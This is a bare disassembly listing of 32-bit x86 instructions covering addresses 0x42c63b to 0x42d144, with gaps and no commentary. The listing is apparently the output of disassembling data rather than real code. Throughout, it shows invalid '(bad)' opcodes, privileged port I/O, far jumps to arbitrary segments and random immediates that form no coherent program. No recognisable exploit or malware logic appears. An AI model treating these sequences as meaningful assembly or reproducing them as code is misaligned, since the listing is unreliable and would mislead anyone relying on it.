  42c63b:	dec    esi
  42c63c:	out    dx,al
  42c63d:	in     eax,dx
  42c63e:	mov    dl,0xe1
  42c640:	dec    esp
	...
  42c6b1:	add    BYTE PTR [eax],al
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x76be,0xba
  42c6c2:	jmp    0x21889da
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [edx-0x17],ch
  42c6ce:	pop    es
  42c6cf:	lahf   
  42c6d0:	push   es
  42c6d1:	mov    al,ds:0x34f4aba0
  42c6d6:	(bad)  
  42c6d7:	sar    ecx,0xea
  42c6da:	fild   DWORD PTR [ebx+0x3b75cc10]
  42c6e0:	xchg   edi,eax
  42c6e1:	cmc    
  42c6e2:	fs pop ebx
  42c6e4:	cmp    BYTE PTR [ebx],cl
  42c6e6:	xchg   ecx,eax
  42c6e7:	and    DWORD PTR [ecx],edi
  42c6e9:	sahf   
  42c6ea:	mov    edx,edx
  42c6ec:	std    
  42c6ed:	pop    esi
  42c6ee:	rcl    BYTE PTR [ebx+ecx*4+0x6c710f1f],0xd3
  42c6f6:	imul   eax,DWORD PTR [edi],0x8b77412b
  42c6fc:	arpl   WORD PTR [edx+0x6116087a],sp
  42c702:	add    ebx,DWORD PTR [ecx-0x49404e72]
  42c708:	cwde   
  42c709:	adc    DWORD PTR ds:0x66fdab05,0x26848d42
  42c713:	xchg   ebp,eax
  42c714:	stc    
  42c715:	into   
  42c716:	popf   
  42c717:	add    al,BYTE PTR [esi-0x5d431268]
  42c71d:	rdtsc  
  42c71f:	add    ch,BYTE PTR [edi+0x63f83255]
  42c725:	xchg   ebp,eax
  42c726:	mov    esi,edi
  42c728:	push   0x79d58352
  42c72d:	jae    0x42c754
  42c72f:	std    
  42c730:	push   es
  42c731:	and    ecx,DWORD PTR [ebx]
  42c733:	adc    al,BYTE PTR [ebx-0x4b]
  42c736:	xchg   edx,eax
  42c737:	dec    ebp
  42c738:	fmul   st,st(7)
  42c73a:	dec    ecx
  42c73b:	je     0x42c6e3
  42c73d:	popa   
  42c73e:	shr    DWORD PTR [edx+0x357a1109],0x52
  42c745:	dec    eax
  42c746:	pop    ss
  42c747:	retf   
  42c748:	and    DWORD PTR [ebx+0x4cdd3e56],0xfaa0b7ba
  42c752:	xchg   ebx,eax
  42c753:	(bad)  
  42c754:	fiadd  DWORD PTR [ebp+0x769bffa7]
  42c75a:	sbb    eax,0x7ced9091
  42c75f:	dec    ebp
  42c760:	add    al,BYTE PTR [eax]
  42c762:	test   BYTE PTR ds:0xefa08834,cl
  42c768:	in     eax,dx
  42c769:	cmp    BYTE PTR [ecx+0x5f],dl
  42c76c:	push   esp
  42c76d:	lods   eax,DWORD PTR ds:[esi]
  42c76e:	leave  
  42c76f:	(bad)  
  42c770:	jbe    0x42c7d5
  42c772:	jge    0x42c758
  42c774:	popf   
  42c775:	pop    esp
  42c776:	in     eax,0x7c
  42c778:	push   ds
  42c779:	pop    esp
  42c77a:	mov    eax,ds:0xf4a44b7b
  42c77f:	jmp    0x42c782
  42c781:	stos   DWORD PTR es:[edi],eax
  42c782:	inc    ebx
  42c783:	jmp    0x8db5:0xa5c282b0
  42c78a:	dec    ebx
  42c78b:	(bad)  
  42c78c:	not    DWORD PTR [esi-0x7b]
  42c78f:	and    BYTE PTR [ecx-0x712b20cb],0xdb
  42c796:	dec    edi
  42c798:	bound  esp,QWORD PTR [edi+0x62]
  42c79b:	outs   dx,DWORD PTR ds:[esi]
  42c79c:	popa   
  42c79d:	pop    ds
  42c79e:	mov    ecx,0xa63a59d1
  42c7a3:	adc    DWORD PTR [ecx-0x67],ebp
  42c7a6:	rcr    DWORD PTR [esi+eax*2-0x47b155ea],0x77
  42c7ae:	sub    eax,0x721215ce
  42c7b3:	inc    esi
  42c7b4:	or     BYTE PTR [eax],cl
  42c7b6:	dec    ebx
  42c7b7:	aas    
  42c7b8:	pop    esi
  42c7b9:	mov    esi,0x7bb2a778
  42c7be:	mov    dh,0x2d
  42c7c0:	jo     0x42c7c2
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x22faf74a
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    BYTE PTR [esi],ah
  42c84d:	sbb    al,0xbe
  42c84f:	and    ah,al
  42c851:	add    DWORD PTR [edx+0x31],esp
  42c854:	dec    DWORD PTR [esi]
  42c856:	cmp    al,0x76
  42c858:	mov    edx,0x5197967b
  42c85d:	ja     0x42c805
  42c85f:	maxps  xmm1,XMMWORD PTR [ebx+0x4f9ab418]
  42c866:	pop    eax
  42c868:	popf   
  42c869:	cmp    ch,BYTE PTR [esi]
  42c86b:	xchg   edx,eax
  42c86c:	call   0x112b:0x8152868f
  42c873:	adc    DWORD PTR [ebx+0xb8e6576],0xffffffec
  42c87a:	retf   
  42c87b:	ror    ebp,0x27
  42c87e:	sti    
  42c87f:	push   ecx
  42c880:	or     al,ch
  42c882:	mov    ebp,0x1aa30ef0
  42c887:	addr16 out 0xc5,eax
  42c88a:	or     eax,DWORD PTR [eax-0x5294d7b6]
  42c890:	ins    DWORD PTR es:[edi],dx
  42c891:	out    0x19,al
  42c893:	stc    
  42c894:	add    BYTE PTR [eax],0x22
  42c897:	mov    WORD PTR [edx],es
  42c899:	aaa    
  42c89a:	into   
  42c89b:	xor    al,0x6e
  42c89d:	(bad)  
  42c89e:	mov    ch,0xeb
  42c8a0:	inc    edx
  42c8a1:	jne    0x42c8d7
  42c8a3:	addr16 pop es
  42c8a5:	sbb    edx,DWORD PTR [ebx]
  42c8a7:	push   es
  42c8a8:	jmp    0x39f36701
  42c8ad:	(bad)  
  42c8ae:	jecxz  0x42c908
  42c8b0:	dec    edi
  42c8b1:	out    dx,eax
  42c8b2:	ds sahf 
  42c8b4:	jns    0x42c863
  42c8b6:	xchg   ebp,eax
  42c8b7:	inc    ecx
  42c8b8:	mov    es,WORD PTR [edx+eax*2]
  42c8bb:	ficomp WORD PTR [ecx-0x33f0c594]
  42c8c1:	sub    dl,dh
  42c8c3:	in     al,0xa
  42c8c5:	jl     0x42c8e9
  42c8c7:	into   
  42c8c8:	popfw  
  42c8ca:	push   es
  42c8cb:	ds pusha 
  42c8cd:	fld    TBYTE PTR [edx-0x30690b87]
  42c8d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8d4:	and    DWORD PTR [ebx-0xa],edx
  42c8d7:	int3   
  42c8d8:	(bad)  
  42c8da:	or     eax,0x836384f9
  42c8df:	cmc    
  42c8e0:	(bad)  
  42c8e1:	jno    0x42c87c
  42c8e3:	ja     0x42c926
  42c8e5:	mov    fs,WORD PTR [esi+0x2f3afab4]
  42c8eb:	into   
  42c8ec:	mov    eax,0x33837d2e
  42c8f1:	icebp  
  42c8f2:	std    
  42c8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8f4:	mov    ah,0x52
  42c8f6:	iret   
  42c8f7:	mov    dh,BYTE PTR [esi]
  42c8f9:	adc    al,0x6f
  42c8fb:	aas    
  42c8fc:	sub    bl,cl
  42c8fe:	xor    eax,0xe7b30739
  42c903:	arpl   WORD PTR [edx-0x20],dx
  42c906:	aaa    
  42c907:	cwde   
  42c908:	fs and eax,0x4c7663d1
  42c90e:	or     DWORD PTR [eax-0x1f001732],ecx
  42c914:	es cmp eax,0x5ed88dc
  42c91a:	sbb    DWORD PTR [ebp+0x6f855ff3],0xd88edacb
  42c924:	test   BYTE PTR [ebx-0x68781f0d],ch
  42c92a:	xor    edx,esi
  42c92c:	into   
  42c92d:	(bad)
  42c930:	pop    esp
  42c931:	push   ecx
  42c932:	mov    DWORD PTR [ecx],ecx
  42c934:	mov    eax,0xcdda8c4f
  42c939:	mov    ds:0x22f0c1c4,eax
  42c93e:	push   es
  42c93f:	push   edi
  42c940:	push   ecx
	...
  42c9b1:	add    BYTE PTR [eax],al
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    ah,BYTE PTR [ecx-0x52231556]
  42c9c5:	xlat   BYTE PTR ds:[ebx]
  42c9c6:	add    DWORD PTR [eax],eax
  42c9c8:	cmc    
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [edx],bh
  42c9cd:	shl    BYTE PTR [esi+eax*2],cl
  42c9d0:	call   0x5ec54e33
  42c9d5:	push   0x29322af
  42c9da:	or     edi,DWORD PTR [ebx]
  42c9dc:	sub    esp,esp
  42c9de:	mov    DWORD PTR [ebp-0x7fd7f5de],edx
  42c9e4:	sub    BYTE PTR [esp+eiz*4-0x42],al
  42c9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9e9:	or     DWORD PTR [esi],0xf1a61e90
  42c9ef:	inc    esi
  42c9f0:	out    0x9b,al
  42c9f2:	(bad)  
  42c9f3:	in     al,0xdf
  42c9f5:	mov    esi,0x412a31fa
  42c9fa:	(bad)  
  42c9fb:	mov    eax,0x534b1af1
  42ca00:	pop    ebp
  42ca01:	add    al,dh
  42ca03:	aas    
  42ca04:	ret    
  42ca05:	xchg   esi,eax
  42ca06:	stc    
  42ca07:	fisttp QWORD PTR [ebp+eiz*1-0x42]
  42ca0b:	or     eax,0x2293ce3
  42ca10:	pop    edx
  42ca11:	mov    esp,0x75d53f43
  42ca16:	call   0x1d48:0xaff4f565
  42ca1d:	(bad)  
  42ca1e:	xor    eax,DWORD PTR [ecx]
  42ca20:	jle    0x42c9d9
  42ca22:	jl     0x42ca45
  42ca24:	fstp   TBYTE PTR [ebx]
  42ca26:	mov    esi,0x4f8fed88
  42ca2b:	push   ss
  42ca2c:	add    esi,DWORD PTR [ecx+0x27]
  42ca2f:	mov    WORD PTR [ecx-0x17ebeda0],fs
  42ca35:	test   ebx,0x95bbe3f
  42ca3b:	mov    eax,0x203347c3
  42ca40:	xchg   edx,eax
  42ca41:	jg     0x42c9c4
  42ca43:	xchg   esp,eax
  42ca44:	add    esi,DWORD PTR [edi+esi*1+0x104beec2]
  42ca4b:	lods   eax,DWORD PTR ds:[esi]
  42ca4c:	ret    
  42ca4d:	and    ch,bl
  42ca4f:	xor    eax,0xa71070bc
  42ca54:	xchg   ebx,eax
  42ca55:	clc    
  42ca56:	push   eax
  42ca57:	mov    ebx,0x1727f680
  42ca5c:	push   ecx
  42ca5d:	inc    ebx
  42ca5e:	xor    esi,DWORD PTR [esi+0x64]
  42ca61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca62:	fcom   QWORD PTR [ecx+0x37099a]
  42ca68:	dec    edi
  42ca69:	js     0x42cad7
  42ca6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca6c:	(bad)  [esi+eax*1+0x79]
  42ca70:	in     al,0x11
  42ca72:	retf   0xff5e
  42ca75:	pop    ss
  42ca76:	(bad)  
  42ca77:	jae    0x42ca11
  42ca79:	outs   dx,DWORD PTR ds:[esi]
  42ca7a:	sar    bh,0xdd
  42ca7d:	mov    ds:0x23b31194,eax
  42ca82:	xor    eax,0x9c29878
  42ca87:	test   bl,bl
  42ca89:	push   cs
  42ca8a:	dec    ebx
  42ca8b:	add    al,0x3c
  42ca8d:	mov    bh,0xab
  42ca8f:	jecxz  0x42ca72
  42ca91:	(bad)  
  42ca92:	(bad)  
  42ca94:	pop    es
  42ca95:	sbb    eax,0x62247b05
  42ca9a:	and    bl,BYTE PTR [ebx]
  42ca9c:	stos   BYTE PTR es:[edi],al
  42ca9d:	sbb    al,0xe4
  42ca9f:	ror    ecx,1
  42caa1:	jle    0x42ca42
  42caa3:	or     ecx,ecx
  42caa5:	xor    al,0x7f
  42caa7:	push   cs
  42caa8:	xchg   edi,eax
  42caa9:	test   DWORD PTR [ecx-0x540ca224],esp
  42caaf:	add    eax,0x143c55de
  42cab4:	add    eax,0x847e1f97
  42cab9:	push   0x204a31d8
  42cabe:	repnz mov ebx,0x7d
	...
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	rcl    DWORD PTR [ecx-0x275d2725],1
  42cb46:	add    DWORD PTR [eax],eax
  42cb48:	cmc    
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR ds:0x9c415d2b,bh
  42cb51:	stos   BYTE PTR es:[edi],al
  42cb52:	aam    0xa
  42cb54:	mov    al,0x2d
  42cb56:	(bad)  [edi-0x9b5a9f]
  42cb5c:	mov    ebp,0xdb4f3f36
  42cb61:	adc    DWORD PTR [ebx+0x25],0xffffff84
  42cb65:	ins    DWORD PTR es:[edi],dx
  42cb66:	and    al,0x4c
  42cb68:	in     al,dx
  42cb69:	popf   
  42cb6a:	cmp    al,0xfd
  42cb6c:	inc    ebp
  42cb6d:	xor    ch,BYTE PTR [ebp+0x2f3fa339]
  42cb73:	mov    esp,0x6b7fa6c2
  42cb78:	call   0x5fb4:0xc0805e97
  42cb7f:	push   ebx
  42cb80:	scas   al,BYTE PTR es:[edi]
  42cb81:	daa    
  42cb82:	cmp    BYTE PTR [esi],dh
  42cb84:	jae    0x42cb78
  42cb86:	push   cs
  42cb87:	fstp   QWORD PTR [ecx-0x30]
  42cb8a:	in     al,0xf4
  42cb8c:	mov    edx,esi
  42cb8e:	cli    
  42cb8f:	test   al,0x7b
  42cb91:	push   ebx
  42cb92:	cmp    al,0xb4
  42cb94:	adc    esi,DWORD PTR [edx+0x61]
  42cb97:	pop    es
  42cb98:	pop    ecx
  42cb99:	in     eax,0x7c
  42cb9b:	or     BYTE PTR ds:[esi+0x6d892f17],bl
  42cba2:	out    0x4c,eax
  42cba4:	sub    BYTE PTR [eax-0x63f8326a],0x9e
  42cbab:	cmp    eax,0x203a1496
  42cbb0:	ja     0x42cc20
  42cbb2:	mov    al,dh
  42cbb4:	dec    esp
  42cbb5:	push   edi
  42cbb6:	rcl    DWORD PTR [edi+ebx*1+0x6c717e02],cl
  42cbbd:	mov    al,0xf4
  42cbbf:	call   0xe9082fe1
  42cbc4:	mov    bl,0xee
  42cbc6:	ja     0x42cba2
  42cbc8:	icebp  
  42cbc9:	jecxz  0x42cc16
  42cbcb:	test   al,0x6f
  42cbcd:	and    al,0xc5
  42cbcf:	gs jecxz 0x42cb5e
  42cbd2:	cdq    
  42cbd3:	icebp  
  42cbd4:	js     0x42cc23
  42cbd6:	sub    BYTE PTR [ebp+eax*4+0x70],ch
  42cbda:	mov    esp,0xf1cc0bf7
  42cbdf:	or     edx,DWORD PTR ss:0xb4cc5eaf
  42cbe6:	cwde   
  42cbe7:	dec    ecx
  42cbe8:	into   
  42cbe9:	test   BYTE PTR [ebx+0x4d96fc14],cl
  42cbef:	lds    edx,FWORD PTR [edx-0x1e8c6008]
  42cbf5:	ins    DWORD PTR es:[edi],dx
  42cbf6:	cwde   
  42cbf7:	repz mov ebx,0xf7db3bc3
  42cbfd:	retf   
  42cbfe:	or     edi,DWORD PTR [ebx-0x4a3c290c]
  42cc04:	imul   DWORD PTR [ecx+0xc8c8ea9]
  42cc0a:	out    dx,al
  42cc0b:	jbe    0x42cc6e
  42cc0d:	xchg   ebp,eax
  42cc0e:	cmp    esp,DWORD PTR [edx-0x61cec1c5]
  42cc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc15:	mov    esp,0x79cb17ca
  42cc1a:	aad    0x2c
  42cc1c:	mov    ebx,0x92ef1086
  42cc21:	or     eax,0x71b519ea
  42cc26:	or     BYTE PTR [esi+eax*1-0x6b3fc49e],dh
  42cc2d:	jecxz  0x42cc8b
  42cc2f:	push   es
  42cc30:	inc    eax
  42cc31:	jbe    0x42cbe5
  42cc33:	mov    BYTE PTR [ebp-0x4ef35894],bh
  42cc39:	outs   dx,DWORD PTR ds:[esi]
  42cc3a:	mov    al,0x33
  42cc3c:	retf   0x27a2
  42cc3f:	(bad)  
  42cc40:	repnz add BYTE PTR [eax],al
	...
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    ebx,DWORD PTR [ebx]
  42ccc1:	jno    0x42ccda
  42ccc3:	xchg   esi,eax
  42ccc4:	xchg   edi,eax
  42ccc5:	fld    DWORD PTR [ecx]
  42ccc7:	add    ch,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebp-0x743f6e1f],bl
  42ccd1:	test   DWORD PTR [ebx-0x7a],0x9ed84e6f
  42ccd8:	out    dx,al
  42ccd9:	or     DWORD PTR [ebp-0x3204dfc6],ecx
  42ccdf:	xchg   esi,eax
  42cce0:	in     eax,dx
  42cce1:	gs cwde 
  42cce3:	mov    DWORD PTR [ecx-0x75],ebx
  42cce6:	scas   eax,DWORD PTR es:[edi]
  42cce7:	ins    BYTE PTR es:[edi],dx
  42cce8:	xlat   BYTE PTR ds:[ebx]
  42cce9:	pop    ebp
  42ccea:	aam    0xb0
  42ccec:	aaa    
  42cced:	or     eax,ebp
  42ccef:	jnp    0x42ccdb
  42ccf1:	fsub   DWORD PTR ds:0x7a16d42c
  42ccf7:	(bad)  
  42ccf8:	ss xor eax,0x8bef90df
  42ccfe:	aam    0x23
  42cd00:	mov    eax,ds:0x6b06c96
  42cd05:	xchg   edx,eax
  42cd06:	jne    0x42cc9f
  42cd08:	sub    ebx,edi
  42cd0a:	and    BYTE PTR [ebx+0x488f5093],ah
  42cd10:	jmp    0x42cd90
  42cd12:	mov    edi,0x10c2259c
  42cd17:	mov    esp,0xba351487
  42cd1c:	add    DWORD PTR [edx+ebx*2],esp
  42cd1f:	loopne 0x42ccdf
  42cd21:	pushf  
  42cd22:	inc    ecx
  42cd23:	fwait
  42cd24:	add    BYTE PTR [ebp+0x460edadb],al
  42cd2a:	xor    BYTE PTR [esi-0xdb65267],dh
  42cd30:	pusha  
  42cd31:	xchg   esi,eax
  42cd32:	xor    al,0x7f
  42cd34:	test   BYTE PTR [eax+0x53],cl
  42cd37:	xchg   BYTE PTR [ebx+ebx*8-0x3b46ac37],bh
  42cd3e:	loop   0x42ccdd
  42cd40:	lods   al,BYTE PTR ds:[esi]
  42cd41:	push   es
  42cd42:	fdiv   st(4),st
  42cd44:	push   edx
  42cd45:	(bad)  
  42cd46:	scas   eax,DWORD PTR es:[edi]
  42cd47:	push   ecx
  42cd48:	std    
  42cd49:	push   esi
  42cd4a:	icebp  
  42cd4b:	int    0xf4
  42cd4d:	inc    edx
  42cd4e:	jl     0x42cd20
  42cd50:	outs   dx,DWORD PTR ds:[esi]
  42cd51:	pop    esi
  42cd52:	mov    bl,0xb7
  42cd54:	jmp    0x3485e44a
  42cd59:	call   0xd943b5f0
  42cd5e:	push   ebx
  42cd5f:	sub    eax,0xb8398c90
  42cd64:	shr    BYTE PTR [esp+ebp*1],cl
  42cd67:	pop    es
  42cd68:	je     0x42cdbd
  42cd6a:	jg     0x42cd64
  42cd6c:	fcomip st,st(6)
  42cd6e:	and    BYTE PTR [ecx],ch
  42cd70:	mov    eax,ds:0xb75fbc37
  42cd75:	lods   al,BYTE PTR ds:[esi]
  42cd76:	mov    ebx,0x4a813293
  42cd7b:	jle    0x42cdb0
  42cd7d:	xor    al,0xed
  42cd7f:	int3   
  42cd80:	cmp    dl,0xd
  42cd83:	js     0x42cd4b
  42cd85:	xchg   BYTE PTR [edx-0x2c],ah
  42cd88:	pop    ds
  42cd89:	push   0xd2ea0480
  42cd8e:	jg     0x42cd81
  42cd90:	aaa    
  42cd91:	clc    
  42cd92:	or     al,0x9d
  42cd94:	push   edx
  42cd95:	dec    edi
  42cd96:	mov    cl,0xce
  42cd98:	lods   al,BYTE PTR ds:[esi]
  42cd99:	fst    QWORD PTR [edx]
  42cd9b:	cmc    
  42cd9c:	or     eax,0xfb05d43b
  42cda1:	(bad)  
  42cda2:	jg     0x42cd52
  42cda4:	or     ebx,eax
  42cda6:	(bad)
  42cda9:	jo     0x42cd2d
  42cdab:	shr    BYTE PTR [ecx],1
  42cdad:	xor    BYTE PTR [esi-0x7a506fa],0xcd
  42cdb4:	cmp    dh,BYTE PTR [ebx-0x64]
  42cdb7:	ret    0x6884
  42cdba:	sbb    ebx,DWORD PTR [eax-0x7d70731e]
  42cdc0:	std    
	...
  42ce31:	add    BYTE PTR [eax],al
  42ce33:	add    BYTE PTR [edi-0x825b8e0],dl
  42ce39:	call   FWORD PTR [edi+0x410aba6d]
  42ce3f:	sbb    DWORD PTR [ebp+eiz*8+0x0],ecx
  42ce43:	fs mov edx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	cmc    
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    BYTE PTR [ebp-0x7e],dh
  42ce4e:	mov    dl,0xe3
  42ce50:	sub    ah,BYTE PTR [ecx+0x32]
  42ce53:	(bad)  
  42ce54:	and    ecx,DWORD PTR [ebp+0x42]
  42ce57:	pop    eax
  42ce58:	xor    al,0x43
  42ce5a:	pop    ss
  42ce5b:	gs xchg esp,eax
  42ce5d:	add    cl,BYTE PTR [edi-0x67925813]
  42ce63:	push   eax
  42ce64:	es not cl
  42ce67:	dec    esp
  42ce68:	mov    ch,0x6b
  42ce6a:	in     eax,dx
  42ce6b:	jo     0x42ce92
  42ce6d:	imul   esp,eax,0x79
  42ce70:	and    BYTE PTR [eax],ah
  42ce72:	add    eax,0x181e30f0
  42ce77:	push   0x1ad46342
  42ce7c:	mov    ecx,0x97913539
  42ce81:	sbb    BYTE PTR [ecx-0x4ad5bb0d],bl
  42ce87:	pop    es
  42ce88:	push   ds
  42ce89:	xchg   esp,eax
  42ce8a:	sbb    DWORD PTR [eax],ebp
  42ce8c:	push   esi
  42ce8d:	xlat   BYTE PTR ds:[ebx]
  42ce8e:	int3   
  42ce8f:	push   eax
  42ce90:	aaa    
  42ce91:	xor    esp,eax
  42ce93:	adc    eax,DWORD PTR cs:[eax-0x50afd767]
  42ce9a:	addr16 jp 0x42cec2
  42ce9d:	(bad)  
  42ce9e:	(bad)  
  42ce9f:	fisttp DWORD PTR [ebp+0x4aeaf1a6]
  42cea5:	arpl   WORD PTR [edx+0x709a5fe2],dx
  42ceab:	sbb    ebp,DWORD PTR [ecx+0x1c]
  42ceae:	mov    bl,0x80
  42ceb0:	mov    edi,0x2ecb4791
  42ceb5:	jl     0x42ce68
  42ceb7:	push   es
  42ceb8:	out    dx,eax
  42ceb9:	pushf  
  42ceba:	jg     0x42cf15
  42cebc:	daa    
  42cebd:	dec    esi
  42cebe:	shr    BYTE PTR [eax],cl
  42cec0:	nop
  42cec1:	pop    es
  42cec2:	adc    ecx,ebx
  42cec4:	ret    
  42cec5:	(bad)  
  42cec6:	cmp    al,0x4d
  42cec8:	dec    ecx
  42cec9:	rol    DWORD PTR [edi+0x555a7d4b],0xe0
  42ced0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ced1:	xchg   esp,eax
  42ced2:	inc    esp
  42ced3:	cmp    eax,0x6b959922
  42ced8:	mov    cl,0x56
  42ceda:	sbb    eax,0x8a09aa75
  42cedf:	(bad)  
  42cee0:	and    eax,DWORD PTR [esi+ecx*1]
  42cee3:	mov    edi,0x93fc11a3
  42cee8:	push   0x11
  42ceea:	mul    DWORD PTR ds:0x7adef1e9
  42cef0:	ss popf 
  42cef2:	jb     0x42ced1
  42cef4:	dec    edi
  42cef5:	aas    
  42cef6:	(bad)  
  42cef7:	xor    ebx,esp
  42cef9:	adc    esp,DWORD PTR [edi]
  42cefb:	in     eax,0x12
  42cefd:	es sub edx,edi
  42cf00:	push   eax
  42cf01:	imul   ebx,DWORD PTR [eax],0x4ac3b7c6
  42cf07:	mov    ds,WORD PTR [edi-0x4c740f5]
  42cf0d:	int    0xbe
  42cf0f:	push   cs
  42cf10:	in     eax,dx
  42cf11:	in     eax,0x7e
  42cf13:	cmp    al,0xb4
  42cf15:	shr    BYTE PTR [esi-0x28af5fa],cl
  42cf1b:	das    
  42cf1c:	cli    
  42cf1d:	fild   QWORD PTR [esi-0x46]
  42cf20:	jbe    0x42ceba
  42cf22:	iret   
  42cf23:	imul   edi,DWORD PTR [esi+0x6b],0x2b6416b6
  42cf2a:	xlat   BYTE PTR ds:[ebx]
  42cf2b:	adc    DWORD PTR [ecx-0x64996c48],ecx
  42cf31:	mov    BYTE PTR [esi+0x53],ah
  42cf34:	xor    al,0xa3
  42cf36:	xor    DWORD PTR [edi+0x7da956bd],edi
  42cf3c:	mov    dl,0x97
  42cf3e:	and    DWORD PTR [ecx+0x4f],ecx
	...
  42cfb1:	add    BYTE PTR [eax],al
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x8f
  42cfc1:	out    0x62,al
  42cfc3:	icebp  
  42cfc4:	sbb    ebx,0xf50001
  42cfca:	add    BYTE PTR [eax],al
  42cfcc:	aaa    
  42cfcd:	xor    DWORD PTR [ebx+0x2c8c2613],0xfffffffa
  42cfd4:	pop    ecx
  42cfd5:	cdq    
  42cfd6:	into   
  42cfd7:	mov    ebp,0xf4e576d6
  42cfdc:	test   al,0xc3
  42cfde:	nop
  42cfdf:	stos   DWORD PTR es:[edi],eax
  42cfe0:	das    
  42cfe1:	or     BYTE PTR [ebx+0x62],dh
  42cfe4:	jb     0x42cfdb
  42cfe6:	add    edi,eax
  42cfe8:	mov    ds:0x8daaa2d7,eax
  42cfed:	cmp    al,0xee
  42cfef:	scas   al,BYTE PTR es:[edi]
  42cff0:	(bad)  
  42cff2:	in     al,0x6d
  42cff4:	push   ecx
  42cff5:	pop    ebp
  42cff6:	push   es
  42cff7:	test   BYTE PTR [eax+0x78f90777],0x8a
  42cffe:	sbb    DWORD PTR [esi-0x6c58cfe1],0xffffffd4
  42d005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d006:	shr    BYTE PTR [esi+ecx*4-0x51],cl
  42d00a:	cmc    
  42d00b:	inc    ecx
  42d00c:	popf   
  42d00d:	pop    ebx
  42d00e:	ja     0x42cfe1
  42d010:	mov    dh,0xed
  42d012:	mov    ecx,DWORD PTR [ecx]
  42d014:	push   0xffffffa2
  42d016:	cmc    
  42d017:	push   0x3f
  42d019:	ins    DWORD PTR es:[edi],dx
  42d01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d01b:	xor    BYTE PTR [esi+0x2a04270b],ah
  42d021:	mov    esi,0x89d9f293
  42d026:	sbb    BYTE PTR [ebx+0x4b],dh
  42d029:	dec    ebx
  42d02a:	sbb    eax,0xa4053da
  42d02f:	icebp  
  42d030:	add    eax,DWORD PTR [eax-0x66]
  42d033:	and    ecx,DWORD PTR [ecx]
  42d035:	stc    
  42d036:	or     esp,eax
  42d038:	sub    esi,DWORD PTR [ecx]
  42d03a:	sub    bl,al
  42d03c:	cmp    edi,0xb141a5a9
  42d042:	push   es
  42d043:	stos   BYTE PTR es:[edi],al
  42d044:	sbb    eax,0xe405dafd
  42d049:	jb     0x42cfcb
  42d04b:	data16 ja 0x42d039
  42d04e:	inc    ecx
  42d04f:	dec    edx
  42d050:	jnp    0x42d0b8
  42d052:	sub    BYTE PTR [ecx-0x21],0x47
  42d056:	jmp    0x9002b4d5
  42d05b:	lahf   
  42d05c:	mov    ah,0xe5
  42d05e:	mov    ebx,0x18dbeff
  42d063:	leave  
  42d064:	cld    
  42d065:	dec    edi
  42d066:	push   ecx
  42d067:	jle    0x42d08b
  42d069:	jbe    0x42d0c6
  42d06b:	fcmove st,st(4)
  42d06d:	xlat   BYTE PTR ds:[ebx]
  42d06e:	pusha  
  42d06f:	std    
  42d070:	xchg   BYTE PTR [ebx],ch
  42d072:	daa    
  42d073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d074:	out    dx,al
  42d075:	js     0x42d082
  42d077:	mov    ebx,DWORD PTR [edi+0x66]
  42d07a:	cs cld 
  42d07c:	and    BYTE PTR [ebx],bh
  42d07e:	ins    DWORD PTR es:[edi],dx
  42d07f:	mov    DWORD PTR [edx-0x336245fb],edi
  42d085:	pop    ebp
  42d086:	shl    BYTE PTR [eax+0x13339745],1
  42d08c:	push   edi
  42d08d:	jmp    0xb67a:0x5183955f
  42d094:	arpl   WORD PTR [esi-0x1acdb0e6],bp
  42d09a:	sbb    eax,0x65bed9e4
  42d09f:	(bad)  
  42d0a0:	pop    edi
  42d0a1:	loop   0x42d08b
  42d0a3:	(bad)  
  42d0a5:	std    
  42d0a6:	mov    dh,0x91
  42d0a8:	out    dx,al
  42d0a9:	mov    ecx,0x53201d5c
  42d0ae:	inc    ebx
  42d0af:	imul   ecx,DWORD PTR [edx-0x34],0xaa6d0dcb
  42d0b6:	push   0x66
  42d0b8:	mov    al,ds:0x46e03051
  42d0bd:	push   ds
  42d0be:	and    dl,BYTE PTR [ebp+0x94]
	...
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0x5abb9c50
  42d143:	pop    ebx
  42d144:	jbe    0x42d122
